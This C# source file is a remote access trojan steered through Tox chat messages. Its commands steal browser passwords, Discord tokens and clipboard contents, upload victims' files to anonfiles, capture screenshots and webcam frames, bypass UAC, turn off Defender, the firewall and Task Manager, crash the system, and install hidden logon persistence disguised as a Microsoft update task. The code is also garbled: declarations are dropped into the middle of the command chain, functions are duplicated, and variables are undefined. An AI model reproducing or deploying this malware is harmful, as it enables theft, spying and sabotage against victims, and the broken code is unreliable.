using System;
using System.IO;
using System.Linq;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Security.Cryptography;
using Tox;
using System.Windows.Forms;
using System.Security.Principal;

class Program
{
    static Tox tox;
    static string tempPath = Path.GetTempPath();

    static void Main(string[] args)
    {
        tox = new Tox();

        // Connect to the Tox network
        tox.Bootstrap("node.tox.biribiri.org", 33445, new ToxKey("9535C4F7B144F4AB4D7E1F9BFB4E2F9E8E6779B1E3A64B7F8E8B07F2A3E3E3F"));

        // Register a callback for when a friend sends a message
        tox.OnFriendMessage += Tox_OnFriendMessage;

        while (true)
        {
            tox.Do();
            System.Threading.Thread.Sleep(tox.IterationInterval);
        }
    }

    static void Tox_OnFriendMessage(object sender, ToxEventArgs.FriendMessageEventArgs e)
    {
        string message = e.Message;

        if (message.StartsWith("!ping"))
        {
            tox.SendMessage(e.FriendNumber, "!pong");
        }
        else if (message.StartsWith("!whoami"))
        {
            string name = string.Empty;
            using (Process process = new Process())
            {
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = "/C whoami";
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;
                process.Start();
                name = process.StandardOutput.ReadToEnd();
                process.WaitForExit();
            }
            tox.SendMessage(e.FriendNumber, "You are talking to " + name);
        }
        else if (message.StartsWith("!message"))
        {
            string text = message.Substring(8);
            MessageBox.Show(text);
        }
        else if (message.StartsWith("!voice"))
        {
            string text = message.Substring(6);
            string fileName = "voice.vbs";
            string filePath = Path.Combine(tempPath, fileName);
            string script = "Dim msg, sapi\nmsg =\"" + text + "\"\nsapi=CreateObject(\"sapi.spvoice\")\nsapi.Speak msg";
            File.WriteAllText(filePath, script);
            using (Process process = new Process())
            {
                process.StartInfo.FileName = "wscript.exe";
                process.StartInfo.Arguments = filePath;
                process.Start();
                process.WaitForExit();
                File.Delete(filePath);
            }
        }
        else if (message.StartsWith("!privs"))
        {
            string privs = "User";
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            if (principal.IsInRole(WindowsBuiltInRole.Administrator))
            {
                privs = "Administrator";
            }
            else if (principal.IsInRole(WindowsBuiltInRole.System))
            {
                privs = "System";
            }
            tox.SendMessage(e.FriendNumber, "The program is running at " + privs + " privilege level.");
        }
        else if (message.StartsWith("!cd"))
        {
            string targetDirectory = message.Substring(4);
            try
            {
                Directory.SetCurrentDirectory(targetDirectory);
                tox.SendMessage(e.FriendNumber, "Changed working directory to " + targetDirectory);
            }
            catch (Exception ex)
            {
                tox.SendMessage(e.FriendNumber, "Error: " + ex.Message);
            }
        }
        else if (message.StartsWith("!dir"))
        {
            string currentDirectory = Directory.GetCurrentDirectory();
            tox.SendMessage(e.FriendNumber, "Current directory: " + currentDirectory);
            
            string[] files = Directory.GetFiles(currentDirectory, "*.*", SearchOption.AllDirectories);
            foreach (string file in files)
            {
                tox.SendMessage(e.FriendNumber, file);
            }
        }
        else if (message.StartsWith("!download"))
        {
            // Get the file path from the message
            string filePath = message.Substring(9);
            
            // Check if the file exists
            if (File.Exists(filePath))
            {
                using (var client = new HttpClient())
                {
                    using (var formData = new MultipartFormDataContent())
                    {
                        // Read the file into a byte array
                        byte[] fileData = File.ReadAllBytes(filePath);
                        
                        // Add the file to the form data
                        formData.Add(new ByteArrayContent(fileData), "file", Path.GetFileName(filePath));
                        
                        // Send the POST request to the anonfiles API
                        var response = await client.PostAsync("https://api.anonfiles.com/upload", formData);
                        
                        // Parse the JSON response
                        string json = await response.Content.ReadAsStringAsync();
                        dynamic data = JsonConvert.DeserializeObject(json);
                        
                        // Get the file link
                        string fileLink = data.data.file.url.full;
                        
                        // Send the file link to the friend
                        tox.SendMessage(e.FriendNumber, "File link: " + fileLink);
                    }
                }
            }
            else
            {
                // Send an error message if the file doesn't exist
                tox.SendMessage(e.FriendNumber, "Error: file not found.");
            }
        }
        else if (message.StartsWith("!upload"))
        {
            ToxFile file = e.FileNumber;
            byte[] fileData = new byte[file.FileSize];
            string fileName = file.FileName;
            string savePath = Path.Combine(Environment.CurrentDirectory, fileName);
            
            // Receive the file
            int received = tox.FileGet(e.FriendNumber, file.FileNumber, fileData, 0, file.FileSize);
            
            // Check if the file was received successfully
            if (received == file.FileSize)
            {
                try
                {
                    File.WriteAllBytes(savePath, fileData);
                    tox.SendMessage(e.FriendNumber, "File uploaded successfully to: " + savePath);
                }
                catch (Exception ex)
                {
                    tox.SendMessage(e.FriendNumber, "Error: " + ex.Message);
                }
            }
            else
            {
                tox.SendMessage(e.FriendNumber, "Error: File transfer failed.");
            }
        }
        else if (message.StartsWith("!delete"))
        {
            // Get the file path from the message
            string filePath = message.Substring(8);
            
            // Check if the file exists
            if (File.Exists(filePath))
            {
                try
                {
                    File.SetAttributes(filePath, FileAttributes.Normal);
                    File.Delete(filePath);
                    tox.SendMessage(e.FriendNumber, "File deleted successfully.");
                }
                catch (Exception ex)
                {
                    tox.SendMessage(e.FriendNumber, "Error: " + ex.Message);
                }
            }
            else
            {
                tox.SendMessage(e.FriendNumber, "Error: File not found.");
            }
        }
        else if (message.StartsWith("!wallpaper"))
        {
            ToxFile file = e.FileNumber;
            byte[] fileData = new byte[file.FileSize];
            string fileName = file.FileName;
            string savePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), fileName);
            
            // Receive the file
            int received = tox.FileGet(e.FriendNumber, file.FileNumber, fileData, 0, file.FileSize);
            
            // Check if the file was received successfully
            if (received == file.FileSize)
            {
                try
                {
                    // Save the image to the My Pictures folder
                    File.WriteAllBytes(savePath, fileData);
                    
                    // Set the wallpaper
                    Wallpaper.Set(savePath, Wallpaper.Style.Stretched);
                    tox.SendMessage(e.FriendNumber, "Wallpaper set successfully.");
                }
                catch (Exception ex)
                {
                    tox.SendMessage(e.FriendNumber, "Error: " + ex.Message);
                }
            }
            else
            {
                tox.SendMessage(e.FriendNumber, "Error: File transfer failed.");
            }
        }
        else if (message.StartsWith("!clipboard"))
        {
            try
            {
                string clipboardText = Clipboard.GetText();
                tox.SendMessage(e.FriendNumber, clipboardText);
            }
            catch (Exception ex)
            {
                tox.SendMessage(e.FriendNumber, "Error: " + ex.Message);
            }
        }
        else if (message.StartsWith("!idletime"))
        {
            var lastInput = new LASTINPUTINFO();
            lastInput.cbSize = (uint)Marshal.SizeOf(lastInput);
            GetLastInputInfo(ref lastInput);
            
            uint idleTime = ((uint)Environment.TickCount - lastInput.dwTime);
            TimeSpan time = TimeSpan.FromMilliseconds(idleTime);
            string idleTimeString = time.ToString(@"dd\.hh\:mm\:ss");
            
            tox.SendMessage(e.FriendNumber, "Idle time: " + idleTimeString);
        }
        
        [StructLayout(LayoutKind.Sequential)]
        struct LASTINPUTINFO
        {
            public static readonly int SizeOf = Marshal.SizeOf(typeof(LASTINPUTINFO));
            [MarshalAs(UnmanagedType.U4)]
            public UInt32 cbSize;
            [MarshalAs(UnmanagedType.U4)]
            public UInt32 dwTime;
        }
        
        [DllImport("User32.dll")]
        extern static bool GetLastInputInfo(ref LASTINPUTINFO plii);
        else if (message.StartsWith("!block"))
        {
            if (IsUserAdministrator())
            {
                BlockInput(true);
                tox.SendMessage(e.FriendNumber, "Keyboard and mouse inputs blocked.");
            }
            else
            {
                tox.SendMessage(e.FriendNumber, "Error: The program must be running with admin privileges to block inputs.");
            }
        }
        [DllImport("user32.dll")]
        private static extern bool BlockInput(bool block);
        
        private static bool IsUserAdministrator()
        {
            bool isAdmin;
            WindowsIdentity user = null;
            try
            {
                user = WindowsIdentity.GetCurrent();
                WindowsPrincipal principal = new WindowsPrincipal(user);
                isAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            catch (UnauthorizedAccessException)
            {
                isAdmin = false;
            }
            catch (Exception)
            {
                isAdmin = false;
            }
            finally
            {
                if (user != null)
                    user.Dispose();
            }
            return isAdmin;
        }
        else if (message.StartsWith("!unblock"))
        {
            if (IsUserAdministrator())
            {
                BlockInput(false);
                tox.SendMessage(e.FriendNumber, "Keyboard and mouse inputs unblocked.");
            }
            else
            {
                tox.SendMessage(e.FriendNumber, "Error: The program must be running with admin privileges to unblock inputs.");
            }
        }
        
        [DllImport("user32.dll")]
        private static extern bool BlockInput(bool block);
        
        private static bool IsUserAdministrator()
        {
            bool isAdmin;
            WindowsIdentity user = null;
            try
            {
                user = WindowsIdentity.GetCurrent();
                WindowsPrincipal principal = new WindowsPrincipal(user);
                isAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            catch (UnauthorizedAccessException)
            {
                isAdmin = false;
            }
            catch (Exception)
            {
                isAdmin = false;
            }
            finally
            {
                if (user != null)
                    user.Dispose();
            }
            return isAdmin;
        }
        else if (message.StartsWith("!screenshot"))
        {
            string screenshotPath = Path.Combine(Path.GetTempPath(), "screenshot.png");
            Bitmap bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                              Screen.PrimaryScreen.Bounds.Height,
                                              PixelFormat.Format32bppArgb);
            
            // Create a graphics object from the bitmap.
            Graphics gfxScreenshot = Graphics.FromImage(bmpScreenshot);
            
            // Take the screenshot from the upper left corner to the right bottom corner.
            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
                                         Screen.PrimaryScreen.Bounds.Y,
                                         0,
                                         0,
                                         Screen.PrimaryScreen.Bounds.Size,
                                         CopyPixelOperation.SourceCopy);
            
            // Save the screenshot to the specified path.
            bmpScreenshot.Save(screenshotPath, ImageFormat.Png);
            tox.SendFile(e.FriendNumber, screenshotPath, "Screenshot.png");
            File.Delete(screenshotPath);
        }
        else if (message.StartsWith("!close"))
        {
            string currentProcessName = Process.GetCurrentProcess().ProcessName;
            Process[] processList = Process.GetProcessesByName(currentProcessName);
            foreach (Process process in processList)
            {
                process.Kill();
            }
        }
        else if (message.StartsWith("!uninstall"))
        {
            string currentProcessName = Process.GetCurrentProcess().ProcessName;
            Process[] processList = Process.GetProcessesByName(currentProcessName);
            foreach (Process process in processList)
            {
                process.Kill();
            }
            string currentExePath = Process.GetCurrentProcess().MainModule.FileName;
            File.Delete(currentExePath);
        }
        else if (message.StartsWith("!uac"))
        {
            string path = Environment.GetEnvironmentVariable("windir");
            string channelId = e.FriendNumber;
            Environment.SetEnvironmentVariable("windir", '"' + path + '"' + " ;#", EnvironmentVariableTarget.User);
            var p = new Process
            {
                StartInfo =
                {
                    UseShellExecute = false,
                    FileName = "SCHTASKS.exe",
                    RedirectStandardError = true,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    Arguments = @"/run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I"
                    }
            };
            try
            {
                p.Start();
                Thread.Sleep(1500);
            }
            catch 
            {
                tox.SendMessage(channelId, "Error: UAC bypass failed.");
            }
            Environment.SetEnvironmentVariable("windir", Environment.GetEnvironmentVariable("systemdrive") + "\\Windows", EnvironmentVariableTarget.User);
        }
        else if (message.StartsWith("!shutdown"))
        {
            Process.Start("shutdown", "/s /t 0");
        }
        else if (message.StartsWith("!restart"))
        {
            Process.Start("shutdown", "/r /t 0");
        }
        else if (message.StartsWith("!logoff"))
        {
            Process.Start("shutdown", "/l");
        }
        else if (message.StartsWith("!lock"))
        {
            Process.Start(@"C:\Windows\System32\rundll32.exe", "user32.dll,LockWorkStation");
        }
        else if (message.StartsWith("!BSOD"))
        {
            bool tmp1;
            uint tmp2;
            RtlAdjustPrivilege(19, true, false, out tmp1);
            NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out tmp2);
        }
        else if (message.StartsWith("!pkill "))
        {
            string processName = message.Substring(7);
            Process[] processList = Process.GetProcessesByName(processName);
            if (processList.Length == 0)
            {
                tox.SendMessage(e.FriendNumber, "Error: Process not found.");
            }
            else
            {
                foreach (Process process in processList)
                {
                    try
                    {
                        process.Kill();
                        tox.SendMessage(e.FriendNumber, "Process " + processName + " killed.");
                    }
                    catch (Exception ex)
                    {
                        tox.SendMessage(e.FriendNumber, "Error: " + ex.Message);
                    }
                }
            }
        }
        else if (message.StartsWith("!defender"))
        {
            RegistryKey key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender", true);
            key.SetValue("DisableAntiSpyware", 1);
            key.SetValue("DisableAntiVirus", 1);
            key.SetValue("DisableFirewall", 1);
            key.SetValue("DisableBehaviorMonitoring", 1);
            key.SetValue("DisableIOAVProtection", 1);
            key.SetValue("DisableRealTimeMonitoring", 1);
            key.Close();
        }
        else if (message.StartsWith("!firewall"))
        {
            var firewall = new INetFwProfile();
            firewall.FirewallEnabled[NET_FW_PROFILE_TYPE2_.NET_FW_PROFILE2_DOMAIN] = false;
            firewall.FirewallEnabled[NET_FW_PROFILE_TYPE2_.NET_FW_PROFILE2_PRIVATE] = false;
            firewall.FirewallEnabled[NET_FW_PROFILE_TYPE2_.NET_FW_PROFILE2_PUBLIC] = false;
        }
        else if (message.StartsWith("!audio"))
        {
            string filePath = Path.GetTempPath() + "audio.mp3"; // change the file format accordingly
            byte[] file = e.GetAttachment();
            File.WriteAllBytes(filePath, file);
            var player = new SoundPlayer(filePath);
            player.Play();
        }
        else if (message.StartsWith("!crit"))
        {
            int isCritical = 1;
            int BreakOnTermination = 0x1D;
            Process.EnterDebugMode();
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
        }
        else if (message.StartsWith("!uncrit"))
        {
            int isCritical = 0;
            int BreakOnTermination = 0x1D;
            Process.EnterDebugMode();
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
        }
        else if (message.StartsWith("!website"))
        {
            string website = message.Substring(8);
            Process.Start(website);
        }
        else if (message.StartsWith("!task"))
        {
            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            if (objRegistryKey.GetValue("DisableTaskMgr") == null) objRegistryKey.SetValue("DisableTaskMgr", "1");
            objRegistryKey.Close();
        }
        else if (message.StartsWith("!startup"))
        {
            string path = Assembly.GetExecutingAssembly().Location;
            using (TaskService ts = new TaskService())
            {
                TaskDefinition td = ts.NewTask();
                td.RegistrationInfo.Description = "Keeps your Microsoft software up to date. If this task is disabled or stopped, your Microsoft software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This task uninstalls itself when there is no Microsoft software using it.";
                td.Triggers.Add(new LogonTrigger());
                td.Actions.Add(new ExecAction(path));
                if (IsElevated)
                {
                    td.Principal.RunLevel = TaskRunLevel.Highest;
                }
                else
                {
                    td.Principal.RunLevel = TaskRunLevel.LUA;
                }
                td.Settings.Enabled = true;
                td.Settings.Hidden = true;
                td.Settings.DisallowStartIfOnBatteries = false;
                td.Settings.StopIfGoingOnBatteries = false;
                td.Settings.StartWhenAvailable = true;
                td.Settings.RunOnlyIfNetworkAvailable = false;
                td.Settings.AllowHardTerminate = false;
                td.Settings.AllowDemandStart = true;
                td.Settings.MultipleInstances = TaskInstancesPolicy.IgnoreNew;
                td.Settings.RunOnlyIfIdle = false;
                td.Settings.WakeToRun = false;
                ts.RootFolder.RegisterTaskDefinition(@"Microsoft Servicing Utility", td);
            }
        }
        else if (message.StartsWith("!geolocate"))
        {
            var client = new WebClient();
            var data = client.DownloadString("http://ip-api.com/json");
            dynamic json = JsonConvert.DeserializeObject(data);
            double lat = json.lat;
            double lon = json.lon;
            var result = new Geolocator().GetGeopositionAsync(lat, lon);
            await Send_message(channelid, result.ToString());
        }
        else if (message.StartsWith("!plist"))
        {
            var procs = Process.GetProcesses();
            StringBuilder sb = new StringBuilder();
            foreach (var proc in procs)
            {
                try
                {
                    sb.AppendLine(proc.ProcessName);
                }
                catch (Exception)
                {
                    tox.SendMessage(e.FriendNumber, "Error: " + ex.Message);
                }
            }
            await Send_message(channelid, sb.ToString());
        }
        else if (message.StartsWith("!password"))
        {
            var chromePasswords = GetChromePasswords();
            var firefoxPasswords = GetFirefoxPasswords();
            var msedgePasswords = GetMsedgePasswords();
            var bravePasswords = GetBravePasswords();
            var opergxPasswords = GetOperagxPasswords();
            await Send_message(channelid, chromePasswords);
            await Send_message(channelid, firefoxPasswords);
            await Send_message(channelid, msedgePasswords);
            await Send_message(channelid, bravePasswords);
            await Send_message(channelid, operagxPasswords);
        }
        else if (message.StartsWith("!webcam"))
        {
            using (var device = new VideoCaptureDevice(VideoCaptureDevice.GetDefaultVideoCaptureDevice()))
            {
                device.NewFrame += (s, e) =>
                {
                    var image = (Bitmap)e.Frame.Clone();
                    var tempFile = Path.GetTempFileName();
                    image.Save(tempFile, ImageFormat.Jpeg);
                    SendFile(tempFile);
                    File.Delete(tempFile);
                };
                device.Start();
            }
        }
        else if (message.StartsWith("!token"))
        {
            string tokenPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb";
            string tokenPathCanary = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discordcanary\\Local Storage\\leveldb";
            string tokenPathWeb = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb";
            var tokens = GetDiscordTokens(tokenPath);
            var tokensCanary = GetDiscordTokens(tokenPathCanary);
            var tokensWeb = GetWebTokens();
            await Send_message(channelid, tokens);
            await Send_message(channelid, tokensCanary);
            await Send_message(channelid, tokensWeb);
        }
        
    }
}
